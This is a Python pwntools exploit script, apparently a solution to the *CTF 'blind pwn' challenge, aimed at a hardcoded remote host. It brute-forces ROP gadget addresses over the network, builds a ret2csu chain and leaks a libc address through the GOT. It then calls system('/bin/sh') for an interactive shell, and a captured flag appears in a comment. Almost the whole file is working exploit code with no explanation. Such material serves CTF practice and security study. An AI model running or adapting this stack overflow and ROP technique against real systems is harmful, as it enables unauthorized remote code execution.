#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './pwn'
TARGET = ('34.92.37.22', 10000)

def find_ret(i):
    try:
        r = remote(TARGET[0], TARGET[1])
        r.recvuntil('Welcome to this blind pwn!\n')
        r.send('a'*40 + p64(0x400705+i)+p64(0x400705))
        data = r.recvuntil('Goodbye!', timeout=1)
        if 'Goodbye' in data:
            log.success('%#x', i)
    except EOFError:
        pass
    finally:
        r.close()

# 0x400783 pop rdi; ret
def find_puts(i):
    try:
        r = remote(TARGET[0], TARGET[1])
        r.recvuntil('Welcome to this blind pwn!\n')
        r.send('a'*40 + p64(0x400783)+p64(0x400000)+p64(0x400000+i))
        data = r.recvall(timeout=2)
        if 'ELF' in data:
            log.success('%#x', i)
            exit()
    except EOFError:
        pass
    finally:
        r.close()

def ret2csu(init,call,rdi=0,rsi=0,rdx=0):
    buf  = ''
    buf += p64(init + 0x5a)
    buf += p64(0)#pop rbx
    buf += p64(1)#pop rbp
    buf += p64(call)#pop r12
    buf += p64(rdx)#pop r13
    buf += p64(rsi)#pop r14
    buf += p64(rdi)#pop r15
    buf += p64(init + 0x40)#ret
    buf  = buf.ljust(0x78,'x')
    return buf

def find_write(i):
    try:
        r = remote(TARGET[0], TARGET[1])
        r.recvuntil('Welcome to this blind pwn!\n')
        log.info("aaaaaaa %#x", i)
        r.send('a'*40 + ret2csu(0x400720, 0x601000+i, 0, 0x400000, 0x100))
        data = r.recv(0x100)
        if len(data)>0:
            print hexdump(data)
    except EOFError:
        pass
    finally:
        r.close()

def leak():
    r = remote(TARGET[0], TARGET[1])
    r.recvuntil('Welcome to this blind pwn!\n')
    r.send('a'*40 + ret2csu(0x400720, 0x601018, 0, 0x400000, 0x1000))
    data = r.recv(0x1000)
    with open('dump', 'wb') as fp:
        fp.write(data)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def exp():
    r = remote(TARGET[0], TARGET[1])
    r.recvuntil('Welcome to this blind pwn!\n')
    r.send('a'*40 + ret2csu(0x400720, 0x601018, 0, 0x601018, 0x8) + p64(0x4006CE))
    libc.address = u64(r.recv(8)) - libc.sym['write']
    log.info("%#x"%libc.address)
    r.recvuntil('Welcome to this blind pwn!\n')
    r.send('a'*40 + p64(0x400783) + p64(libc.search('/bin/sh\x00').next()) + p64(libc.sym['system']))
    r.interactive()
#find_write(0x18)
#leak()
#*CTF{Qri2H5GjeaO1E9Jg6dmwcUvSLX8RxpI7}
exp()
